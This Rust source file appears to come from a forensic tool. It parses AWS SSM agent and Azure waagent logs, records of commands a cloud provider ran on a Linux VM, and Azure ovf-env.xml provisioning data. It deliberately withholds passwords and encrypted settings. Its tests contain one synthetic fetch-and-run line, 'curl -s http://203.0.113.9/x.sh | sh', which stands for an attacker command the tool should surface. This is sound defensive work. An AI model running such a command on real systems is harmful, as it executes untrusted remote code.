//! What cloud agents on a virtual machine log and keep about commands the cloud ran on it.
//!
//! - `ssm-agent-log`: the AWS Systems Manager agent's `amazon-ssm-agent.log` and `errors.log`
//!   (`2026-11-13 01:18:13.5265 INFO message`, local time).
//! - `waagent-log`: the Azure Linux agent's `waagent.log` (`2026-11-13T01:18:47.841715Z INFO
//!   Daemon Daemon message`), with the extension name and version when a line names one
//!   (`[Microsoft.Azure.Extensions.CustomScript-2.1.10]`).
//! - `cloud-remote-exec`: the files that say what was run: SSM Run Command and Session Manager
//!   artefacts under `var/lib/amazon/ssm/<instance>/`, Azure extension settings
//!   (`var/lib/waagent/<extension>-<version>/config/<n>.settings`, whose public part holds the
//!   `commandToExecute` and `fileUris` of the CustomScript and RunCommand extensions) and the
//!   scripts and output those extensions left under `custom-script/` and `run-command/`.
//!   Protected settings are encrypted by the cloud: only their presence is recorded.
//! - `azure-provisioning`: `ovf-env.xml`, which carries the provisioning user name and host
//!   name (and a password hash and cloud-init custom data, of which only presence and size are
//!   recorded).
//!
//! Verified against the real SSM agent and waagent started in a container (their start-up and
//! "cannot reach the cloud" logs). Files only a cloud-delivered command creates (the SSM
//! orchestration tree and state documents, Azure settings, `ovf-env.xml`) could not be produced
//! without a cloud account and follow the vendors' documentation and published forensic write-ups:
//! see "Synthetic only" in docs/LIMITATIONS.md.
//!
//! GCP needs no artifact of its own: the guest agent, OS Login and the metadata script runner log
//! to the journal (`SYSLOG_IDENTIFIER` `google_guest_agent`, `GCEGuestAgent`,
//! `google_metadata_script_runner`, `google_osconfig_agent`, `google-startup-scripts`), which
//! `journald` reads, and `sudoers` reads `google_sudoers`.

use crate::common::stamped_log::{parse, timestamp, Parsed};
use crate::text::{for_each_line, lossy};
use crate::{Artifact, Category, Input, LINUX};
use nixcavate_core::time::parse_iso8601;
use nixcavate_core::{Basis, Error, Event, Loc, Record, Result, Sink, Timestamp};
use serde::Serialize;
use serde_json::Value;

pub const SSM_LOG: Artifact = Artifact::new(
    "ssm-agent-log",
    "AWS Systems Manager agent logs",
    Category::Logs,
    LINUX,
    &[
        "var/log/amazon/ssm/amazon-ssm-agent.log*",
        "var/log/amazon/ssm/errors.log*",
        "var/log/amazon/ssm/ssm-document-worker/*.log*",
    ],
    |input, sink| parse(input, sink, "an SSM agent log", "ssm_agent", ssm_line),
);

/// `2026-11-13 01:18:13.5265 INFO [Component] message`; the bracket may also carry a code
/// location (`[Errorf @ errors.go.26]`).
fn ssm_line<'a>(input: &Input, line: &'a str) -> Option<Parsed<'a>> {
    let (time, used) = parse_iso8601(line.as_bytes())?;
    let rest = line.get(used..)?.strip_prefix(' ')?;
    let (level, message) = rest.split_once(' ')?;
    if !level.bytes().all(|b| b.is_ascii_uppercase()) || level.is_empty() {
        return None;
    }
    let source = message.strip_prefix('[').and_then(|m| m.split_once("] ")).map(|(s, _)| s);
    let lower = message.to_ascii_lowercase();
    let notable = [
        "received",
        "processing",
        "executing",
        "running",
        "session",
        "document",
        "command",
        "started",
        "stopped",
        "shutting",
    ]
    .iter()
    .any(|k| lower.contains(k));
    Some(Parsed {
        time: Some(timestamp(input, &time)),
        level: Some(level),
        source,
        pid: None,
        message,
        timeline: matches!(level, "ERROR" | "WARN") && !lower.contains("failed to find identity")
            || notable && level != "DEBUG",
    })
}

pub const WAAGENT_LOG: Artifact = Artifact::new(
    "waagent-log",
    "Azure Linux agent log",
    Category::Logs,
    LINUX,
    &["var/log/waagent.log*"],
    parse_waagent,
);

#[derive(Serialize)]
struct Waagent<'a> {
    time: Option<Timestamp>,
    level: &'a str,
    /// The agent thread (`Daemon`, `ExtHandler`, `MonitorHandler`).
    thread: &'a str,
    /// The extension a line is about, e.g. `Microsoft.Azure.Extensions.CustomScript`.
    extension: &'a str,
    extension_version: &'a str,
    message: &'a str,
    #[serde(skip)]
    notable: bool,
}

impl Record for Waagent<'_> {
    fn events(&self) -> impl Iterator<Item = Event<'_>> {
        let what = if self.extension.is_empty() {
            self.message.to_string()
        } else {
            format!("{} {}: {}", self.extension, self.extension_version, self.message)
        };
        self.time.filter(|_| self.notable).map(|t| Event::new(t, "cloud_agent", what)).into_iter()
    }
}

/// `Publisher.Type-1.2.3` inside the first bracket of a message.
fn extension_of(message: &str) -> (&str, &str) {
    let Some(inner) = message.strip_prefix('[').and_then(|m| m.split_once(']')).map(|(i, _)| i) else {
        return ("", "");
    };
    let inner = inner.split_whitespace().next().unwrap_or_default();
    match inner.rsplit_once('-') {
        Some((name, version))
            if name.contains('.')
                && version.starts_with(|c: char| c.is_ascii_digit())
                && version.bytes().all(|b| b.is_ascii_digit() || b == b'.') =>
        {
            (name, version)
        }
        _ => ("", ""),
    }
}

/// The time, level, thread and message of a line that starts an entry.
///
/// Agent 2.3 and later: `2021-12-01T06:36:29.505912Z INFO ExtHandler ExtHandler message` (UTC).
/// Agent 2.2: `2021/10/06 18:53:40.334711 INFO Daemon message`, in the host's zone, with the
/// thread name only on the lines of a thread.
fn waagent_fields<'a>(input: &Input, text: &'a str) -> Option<(Timestamp, &'a str, &'a str, &'a str)> {
    let is_level = |level: &str| matches!(level, "INFO" | "WARNING" | "ERROR" | "VERBOSE" | "CRITICAL" | "DEBUG");
    let (first, rest) = text.split_once(' ')?;
    if let Some((time, _)) = parse_iso8601(first.as_bytes()) {
        let mut words = rest.splitn(4, ' ');
        let (level, thread, _, message) = (words.next()?, words.next()?, words.next()?, words.next()?);
        let time = Timestamp::from_secs_nanos(time.secs, time.nanos, time.precision, Basis::Recorded);
        return is_level(level).then_some((time, level, thread, message));
    }
    let (clock, rest) = rest.split_once(' ')?;
    let date = (first.len() == 10 && first.as_bytes().get(4) == Some(&b'/')).then(|| first.replace('/', "-"))?;
    let stamp = format!("{date} {clock}");
    let (time, used) = parse_iso8601(stamp.as_bytes())?;
    let (level, rest) = rest.split_once(' ')?;
    if used != stamp.len() || !is_level(level) {
        return None;
    }
    let (thread, message) = match rest.split_once(' ') {
        Some((thread, message)) if matches!(thread, "Daemon" | "ExtHandler" | "EnvHandler" | "MonitorHandler") => {
            (thread, message)
        }
        _ => ("", rest),
    };
    Some((timestamp(input, &time), level, thread, message))
}

fn parse_waagent(input: &Input, sink: &mut Sink) -> Result<()> {
    let mut seen = false;
    for_each_line(input, |line| {
        let text = lossy(line.bytes);
        let text = text.trim_end();
        if text.trim().is_empty() {
            return Ok(());
        }
        let Some((time, level, thread, message)) = waagent_fields(input, text) else {
            if !seen {
                return Err(Error::format("not a waagent log: the first line starts no entry"));
            }
            // A continuation (a traceback line): kept as text.
            return sink.emit(
                Loc::Line(line.number),
                &Waagent {
                    time: None,
                    level: "",
                    thread: "",
                    extension: "",
                    extension_version: "",
                    message: text,
                    notable: false,
                },
            );
        };
        seen = true;
        let (extension, extension_version) = extension_of(message);
        let verbs = [
            "target handler state",
            "executing command",
            "install",
            "enable",
            "disable",
            "uninstall",
            "update",
            "download",
        ];
        let lower = message.to_ascii_lowercase();
        let notable = (!extension.is_empty() && verbs.iter().any(|v| lower.contains(v)))
            || message.starts_with("Azure Linux Agent Version")
            || lower.contains("provisioning complete");
        sink.emit(
            Loc::Line(line.number),
            &Waagent { time: Some(time), level, thread, extension, extension_version, message, notable },
        )
    })?;
    if seen {
        Ok(())
    } else {
        Err(Error::skipped("empty file"))
    }
}

pub const REMOTE_EXEC: Artifact = Artifact::new(
    "cloud-remote-exec",
    "Commands a cloud ran on the machine: SSM Run Command and Session Manager, Azure extensions",
    Category::Execution,
    LINUX,
    &[
        "var/lib/amazon/ssm/*/document/orchestration/*/*/stdout",
        "var/lib/amazon/ssm/*/document/orchestration/*/*/stderr",
        "var/lib/amazon/ssm/*/document/orchestration/*/*/_script.sh",
        "var/lib/amazon/ssm/*/document/orchestration/*/*/*/stdout",
        "var/lib/amazon/ssm/*/document/orchestration/*/*/*/stderr",
        "var/lib/amazon/ssm/*/document/orchestration/*/*/*/_script.sh",
        "var/lib/amazon/ssm/*/document/state/*/*",
        "var/lib/amazon/ssm/*/session/orchestration/*/*",
        "var/lib/amazon/ssm/*/session/orchestration/*/*/*",
        "var/lib/waagent/*/config/*.settings",
        "var/lib/waagent/custom-script/download/*/*",
        "var/lib/waagent/run-command/download/*/*",
        "var/lib/waagent/run-command-handler/download/*/*/*",
    ],
    parse_exec,
);

const MAX_CONTENT: usize = 64 << 10;

#[derive(Serialize)]
struct Exec {
    /// `aws` or `azure`.
    cloud: &'static str,
    /// `script`, `stdout`, `stderr`, `state`, `session`, `settings` or `file`.
    kind: &'static str,
    instance_id: String,
    /// The SSM command or session id, the Azure download number or settings sequence number.
    id: String,
    /// The SSM plugin (`awsrunShellScript`) or the Azure extension.
    plugin: String,
    plugin_version: String,
    document_name: String,
    /// What was to run: the SSM `runCommand` lines or the Azure `commandToExecute`/script.
    command: String,
    file_uris: Vec<String>,
    status: String,
    /// True when Azure's encrypted protected settings are present (they are not read).
    protected_settings_present: bool,
    time: Option<Timestamp>,
    modified: Option<Timestamp>,
    size_bytes: u64,
    content: String,
    content_truncated: bool,
}

impl Record for Exec {
    fn events(&self) -> impl Iterator<Item = Event<'_>> {
        let what = format!("{} {} {} {}", self.cloud, self.plugin, self.document_name, self.command);
        self.time.map(|t| Event::new(t, "cloud_command", what.trim().to_string())).into_iter()
    }
}

/// The first value of `key` anywhere in `v` (breadth first, a few levels deep).
fn find<'a>(v: &'a Value, key: &str) -> Option<&'a Value> {
    let mut level = vec![v];
    for _ in 0..6 {
        let mut next = Vec::new();
        for node in level {
            match node {
                Value::Object(map) => {
                    if let Some(hit) = map.get(key) {
                        return Some(hit);
                    }
                    next.extend(map.values());
                }
                Value::Array(items) => next.extend(items.iter().take(256)),
                _ => {}
            }
        }
        level = next;
    }
    None
}

fn text_of(v: Option<&Value>) -> String {
    match v {
        Some(Value::String(s)) => s.clone(),
        Some(Value::Array(a)) => a.iter().filter_map(Value::as_str).collect::<Vec<_>>().join("\n"),
        _ => String::new(),
    }
}

fn parse_exec(input: &Input, sink: &mut Sink) -> Result<()> {
    let parts: Vec<&str> = input.path.split('/').collect();
    let name = parts.last().copied().unwrap_or_default();
    let mut record = Exec {
        cloud: "aws",
        kind: "file",
        instance_id: String::new(),
        id: String::new(),
        plugin: String::new(),
        plugin_version: String::new(),
        document_name: String::new(),
        command: String::new(),
        file_uris: Vec::new(),
        status: String::new(),
        protected_settings_present: false,
        time: None,
        modified: (input.mtime > 0).then(|| Timestamp::from_secs(input.mtime, Basis::Recorded)),
        size_bytes: input.data.len() as u64,
        content: String::new(),
        content_truncated: false,
    };
    let after = |marker: &str| parts.iter().position(|p| *p == marker);
    let at = |i: usize| parts.get(i).copied().unwrap_or_default().to_string();
    let mut parse_json = false;
    if let Some(ssm) = after("ssm") {
        record.instance_id = at(ssm + 1);
        if after("session").is_some() {
            record.kind = "session";
            record.id = at(ssm + 4);
            // A session id is `<user>-<random>`: the user is part of what happened.
            record.plugin = at(ssm + 5);
        } else if after("state").is_some() {
            record.kind = "state";
            record.id = name.to_string();
            record.status = at(ssm + 4);
            parse_json = true;
        } else {
            record.id = at(ssm + 4);
            record.plugin = at(ssm + 5);
            record.kind = match name {
                "stdout" => "stdout",
                "stderr" => "stderr",
                _ => "script",
            };
        }
    } else {
        record.cloud = "azure";
        if let Some(download) = after("download") {
            record.id = at(download + 1);
            record.plugin = at(download - 1);
            record.kind = match name {
                "stdout" => "stdout",
                "stderr" => "stderr",
                _ => "script",
            };
        } else {
            // var/lib/waagent/<Publisher.Type>-<version>/config/<n>.settings
            let dir = at(parts.len().saturating_sub(3));
            let (extension, version) = dir.rsplit_once('-').unwrap_or((dir.as_str(), ""));
            record.plugin = extension.to_string();
            record.plugin_version = version.to_string();
            record.id = name.trim_end_matches(".settings").to_string();
            record.kind = "settings";
            parse_json = true;
        }
    }
    let data = input.data.get(..input.data.len().min(MAX_CONTENT)).unwrap_or_default();
    record.content_truncated = data.len() < input.data.len();
    if parse_json {
        let doc: Value = serde_json::from_slice(input.data.get(..input.data.len().min(4 << 20)).unwrap_or_default())
            .map_err(|e| Error::format(format!("not JSON: {e}")))?;
        if record.cloud == "azure" {
            let handler = doc.pointer("/runtimeSettings/0/handlerSettings").unwrap_or(&Value::Null);
            let public = handler.get("publicSettings").unwrap_or(&Value::Null);
            record.command = ["/commandToExecute", "/script", "/source/script", "/source/scriptUri"]
                .iter()
                .map(|k| text_of(public.pointer(k)))
                .find(|t| !t.is_empty())
                .unwrap_or_default();
            let uris = public.get("fileUris").or_else(|| public.pointer("/source/scriptUri"));
            record.file_uris = match uris {
                Some(Value::Array(a)) => a.iter().filter_map(Value::as_str).map(str::to_owned).collect(),
                Some(Value::String(s)) => vec![s.clone()],
                _ => Vec::new(),
            };
            record.protected_settings_present =
                handler.get("protectedSettings").is_some_and(|p| p.as_str() != Some("") && !p.is_null());
            // The public settings are public by definition; keep them, never the protected part.
            record.content = serde_json::to_string(public).unwrap_or_default();
            let mut end = record.content.len().min(MAX_CONTENT);
            while !record.content.is_char_boundary(end) {
                end -= 1;
            }
            record.content.truncate(end);
        } else {
            record.document_name = text_of(find(&doc, "DocumentName"));
            record.command = text_of(find(&doc, "runCommand").or_else(|| find(&doc, "commands")));
            let created = text_of(find(&doc, "CreatedDate"));
            record.time = parse_iso8601(created.as_bytes()).and_then(|(t, _)| t.recorded());
            let status = text_of(find(&doc, "DocumentStatus"));
            if !status.is_empty() {
                record.status = status;
            }
            if record.id.is_empty() {
                record.id = text_of(find(&doc, "CommandID").or_else(|| find(&doc, "CommandId")));
            }
        }
    } else {
        record.content = lossy(data).into_owned();
        if record.kind == "script" {
            record.command = record.content.lines().take(20).collect::<Vec<_>>().join("\n");
        }
    }
    sink.emit(Loc::None, &record)
}

pub const AZURE_PROVISIONING: Artifact = Artifact::new(
    "azure-provisioning",
    "Azure provisioning data (ovf-env.xml): host name and provisioning user",
    Category::System,
    LINUX,
    &["var/lib/waagent/ovf-env.xml", "var/lib/cloud/data/ovf-env.xml", "var/lib/cloud/seed/azure/ovf-env.xml"],
    parse_ovf,
);

#[derive(Serialize)]
struct Ovf {
    host_name: String,
    user_name: String,
    /// True when a password (hash) is present; never output.
    password_present: bool,
    disable_ssh_password_authentication: String,
    /// Base64 custom data (cloud-init user data) is present and this many characters long.
    custom_data_present: bool,
    custom_data_chars: u64,
}

impl Record for Ovf {}

/// The text of `<ns:Tag>...</ns:Tag>` for any namespace prefix.
fn element<'a>(xml: &'a str, tag: &str) -> Option<&'a str> {
    let mut from = 0;
    while let Some(found) = xml.get(from..).and_then(|x| x.find(tag)) {
        let start = from + found;
        let prefix_ok = xml.get(..start).is_some_and(|b| b.ends_with('<') || b.ends_with(':'));
        let after = xml.get(start + tag.len()..)?;
        if prefix_ok && after.starts_with('>') {
            let body = after.get(1..)?;
            return body.split_once("</").map(|(text, _)| text);
        }
        from = start + tag.len();
    }
    None
}

fn parse_ovf(input: &Input, sink: &mut Sink) -> Result<()> {
    let xml = lossy(input.data.get(..input.data.len().min(4 << 20)).unwrap_or_default());
    if xml.trim().is_empty() {
        return Err(Error::skipped("empty file"));
    }
    if !xml.contains("Environment") {
        return Err(Error::format("not an Azure ovf-env.xml (no Environment element)"));
    }
    let custom = element(&xml, "CustomData").unwrap_or_default();
    sink.emit(
        Loc::None,
        &Ovf {
            host_name: element(&xml, "HostName").unwrap_or_default().trim().into(),
            user_name: element(&xml, "UserName").unwrap_or_default().trim().into(),
            password_present: element(&xml, "UserPassword").is_some_and(|p| !p.trim().is_empty()),
            disable_ssh_password_authentication: element(&xml, "DisableSshPasswordAuthentication")
                .unwrap_or_default()
                .trim()
                .into(),
            custom_data_present: !custom.trim().is_empty(),
            custom_data_chars: custom.trim().len() as u64,
        },
    )
}

#[cfg(test)]
mod tests {
    use super::super::k8s_testdata::records;
    use super::*;
    use crate::testing::{fixture, run, run_on_host};

    /// `test_files/cloud-agents/build.sh` started the real SSM agent in a container with no
    /// cloud: the log's own count of attempts is checked against the line count.
    #[test]
    fn real_ssm_agent_logs() {
        let log = fixture("cloud-agents/real/amazon-ssm-agent.log");
        let out = run(&SSM_LOG, "var/log/amazon/ssm/amazon-ssm-agent.log", &log, 0);
        assert!(!out.contains("--- warning") && !out.contains("--- failed"), "{out}");
        let rows = records(&out);
        assert_eq!(rows.len(), String::from_utf8_lossy(&log).lines().count());
        // Every `Checking if agent identity type EC2 can be assumed` line is one attempt to reach IMDS.
        let attempts =
            rows.iter().filter(|r| r["message"].as_str().unwrap().contains("type EC2 can be assumed")).count();
        let failures =
            rows.iter().filter(|r| r["level"] == "ERROR" && r["message"].as_str().unwrap().contains("IMDS")).count();
        // The same counts, taken from the raw file text.
        let raw = String::from_utf8_lossy(&log);
        assert_eq!(attempts, raw.matches("type EC2 can be assumed").count());
        assert_eq!(
            failures,
            raw.lines().filter(|l| l.contains(" ERROR [EC2Identity] Failed to get instance info from IMDS")).count()
        );
        assert_eq!((attempts, failures), (3, 3));
        assert_eq!(rows[0]["time"], "2026-11-13T01:18:13.526500Z");
        let errors = run(&SSM_LOG, "var/log/amazon/ssm/errors.log", &fixture("cloud-agents/real/errors.log"), 0);
        assert!(records(&errors)[0]["source"].as_str().unwrap().starts_with("NewEC2IdentityWithConfig @ "), "{errors}");
        assert!(run(&SSM_LOG, "var/log/amazon/ssm/errors.log", b"not a log line\n", 0).contains("failed"));
    }

    /// Agent 2.2: `YYYY/MM/DD HH:MM:SS.ffffff` in the host's zone, and one word for the thread.
    #[test]
    fn older_waagent_lines_have_slashes_in_the_date() {
        let log = b"2021/10/06 18:53:40.334711 INFO Daemon Azure Linux Agent Version:2.2.45\n\
2021/10/06 18:53:40.344258 INFO Daemon OS: ubuntu 18.04\n\
2021/10/06 18:53:41.000001 WARNING ExtHandler something failed\n";
        let out = run(&WAAGENT_LOG, "var/log/waagent.log.2.gz", log, 0);
        assert!(!out.contains("--- warning") && !out.contains("--- failed"), "{out}");
        let rows = records(&out);
        assert_eq!(rows.len(), 3);
        assert_eq!(rows[0]["time"], "2021-10-06T18:53:40.334711Z");
        assert_eq!((rows[0]["level"].as_str(), rows[0]["thread"].as_str()), (Some("INFO"), Some("Daemon")));
        assert_eq!(rows[0]["message"], "Azure Linux Agent Version:2.2.45");
        assert_eq!(rows[1]["message"], "OS: ubuntu 18.04");
        assert_eq!(rows[2]["thread"], "ExtHandler");
    }

    #[test]
    fn real_waagent_log_and_extension_lines() {
        let out = run(&WAAGENT_LOG, "var/log/waagent.log", &fixture("cloud-agents/real/waagent.log"), 0);
        assert!(!out.contains("--- warning") && !out.contains("--- failed"), "{out}");
        let rows = records(&out);
        assert_eq!(rows.len(), String::from_utf8_lossy(&fixture("cloud-agents/real/waagent.log")).lines().count());
        assert_eq!(rows[0]["thread"], "Daemon");
        assert_eq!(rows[0]["time"], "2026-11-13T01:18:47.841715Z");
        assert!(out.contains("Azure Linux Agent Version:2.7.3.0") && out.contains("cloud_agent"), "{out}");
        let ext = run(&WAAGENT_LOG, "var/log/waagent.log", &fixture("cloud-agents/synthetic/waagent-extension.log"), 0);
        let rows = records(&ext);
        assert_eq!(
            (rows[0]["extension"].as_str(), rows[0]["extension_version"].as_str()),
            (Some("Microsoft.Azure.Extensions.CustomScript"), Some("2.1.10"))
        );
        assert_eq!(rows.len(), 5, "{ext}");
        assert_eq!(rows[3]["time"], serde_json::Value::Null);
        assert_eq!(ext.matches("cloud_agent").count(), 2, "{ext}");
    }

    fn synthetic(path: &str) -> Vec<u8> {
        fixture(&format!("cloud-agents/synthetic/{path}"))
    }

    #[test]
    fn ssm_run_command_script_output_state_and_session() {
        let base = "var/lib/amazon/ssm/i-0123456789abcdef0";
        let cmd = "2c9e8f3a-1b2d-4c5e-9f60-aabbccddeeff";
        let script = format!("{base}/document/orchestration/{cmd}/awsrunShellScript/0.awsrunShellScript/_script.sh");
        let rows = records(&run(&REMOTE_EXEC, &script, &synthetic(&script), 0));
        assert_eq!(
            (rows[0]["kind"].as_str(), rows[0]["id"].as_str(), rows[0]["plugin"].as_str()),
            (Some("script"), Some(cmd), Some("awsrunShellScript"))
        );
        assert_eq!(rows[0]["instance_id"], "i-0123456789abcdef0");
        assert!(rows[0]["content"].as_str().unwrap().contains("curl -s http://203.0.113.9/x.sh | sh"));
        let stdout = script.replace("_script.sh", "stdout");
        assert_eq!(records(&run(&REMOTE_EXEC, &stdout, &synthetic(&stdout), 0))[0]["kind"], "stdout");
        let state = format!("{base}/document/state/completed/{cmd}");
        let out = run(&REMOTE_EXEC, &state, &synthetic(&state), 0);
        let r = &records(&out)[0];
        assert_eq!(
            (r["document_name"].as_str(), r["status"].as_str(), r["id"].as_str()),
            (Some("AWS-RunShellScript"), Some("Success"), Some(cmd))
        );
        assert_eq!(r["command"], "curl -s http://203.0.113.9/x.sh | sh\nid");
        assert!(out.contains("cloud_command") && out.contains("2026-11-12T09:30:15.123Z"), "{out}");
        let session = format!("{base}/session/orchestration/alice-0abc123def456ghi7/Standard_Stream/stdout");
        let r = &records(&run(&REMOTE_EXEC, &session, &synthetic(&session), 0))[0];
        assert_eq!((r["kind"].as_str(), r["id"].as_str()), (Some("session"), Some("alice-0abc123def456ghi7")));
        assert!(run(&REMOTE_EXEC, &state, b"{", 0).contains("failed"));
    }

    #[test]
    fn azure_settings_keep_public_command_and_only_flag_protected_part() {
        let path = "var/lib/waagent/Microsoft.Azure.Extensions.CustomScript-2.1.10/config/3.settings";
        let out = run(&REMOTE_EXEC, path, &synthetic(path), 0);
        assert!(!out.contains("PLANTED"), "{out}");
        let r = &records(&out)[0];
        assert_eq!(
            (r["plugin"].as_str(), r["plugin_version"].as_str(), r["id"].as_str()),
            (Some("Microsoft.Azure.Extensions.CustomScript"), Some("2.1.10"), Some("3"))
        );
        assert_eq!(r["command"], "sh install.sh --token example");
        assert_eq!(r["file_uris"][0], "https://example.blob.core.windows.net/s/install.sh");
        assert_eq!(r["protected_settings_present"], true);
        let script = "var/lib/waagent/custom-script/download/0/install.sh";
        let r = &records(&run(&REMOTE_EXEC, script, &synthetic(script), 0))[0];
        assert_eq!(
            (r["cloud"].as_str(), r["kind"].as_str(), r["id"].as_str()),
            (Some("azure"), Some("script"), Some("0"))
        );
    }

    #[test]
    fn ovf_env_gives_user_and_host_but_no_password() {
        let out = run(&AZURE_PROVISIONING, "var/lib/waagent/ovf-env.xml", &synthetic("var/lib/waagent/ovf-env.xml"), 0);
        assert!(!out.contains("PLANTED") && !out.contains("IyEvYmluL3NoCmVjaG8gaGk"), "{out}");
        let r = &records(&out)[0];
        assert_eq!((r["host_name"].as_str(), r["user_name"].as_str()), (Some("vm-example-01"), Some("azureuser")));
        assert_eq!(
            (r["password_present"].clone(), r["custom_data_present"].clone(), r["custom_data_chars"].clone()),
            (true.into(), true.into(), 24.into())
        );
        assert!(
            run(&AZURE_PROVISIONING, "var/lib/waagent/ovf-env.xml", b"<a/>", 0).contains("not an Azure ovf-env.xml")
        );
        assert!(run(&AZURE_PROVISIONING, "var/lib/waagent/ovf-env.xml", b"", 0).contains("skipped"));
    }

    #[test]
    fn damaged_inputs_never_panic() {
        let mut state = 0x9e37_79b9_7f4a_7c15u64;
        let mut next = || {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            state
        };
        let corpora: Vec<(&Artifact, &str, Vec<u8>)> = vec![
            (&SSM_LOG, "var/log/amazon/ssm/amazon-ssm-agent.log", fixture("cloud-agents/real/amazon-ssm-agent.log")),
            (&WAAGENT_LOG, "var/log/waagent.log", fixture("cloud-agents/real/waagent.log")),
            (&AZURE_PROVISIONING, "var/lib/waagent/ovf-env.xml", synthetic("var/lib/waagent/ovf-env.xml")),
            (
                &REMOTE_EXEC,
                "var/lib/waagent/X-1/config/0.settings",
                synthetic("var/lib/waagent/Microsoft.Azure.Extensions.CustomScript-2.1.10/config/3.settings"),
            ),
        ];
        for round in 0..800 {
            for (artifact, path, original) in &corpora {
                let mut data = original.clone();
                for _ in 0..=(round % 5) {
                    let at = (next() as usize) % data.len();
                    data[at] = next() as u8;
                }
                if round % 4 == 0 {
                    data.truncate((next() as usize) % data.len());
                }
                run_on_host(artifact, &[(path, &data)], path, 0);
            }
        }
    }
}
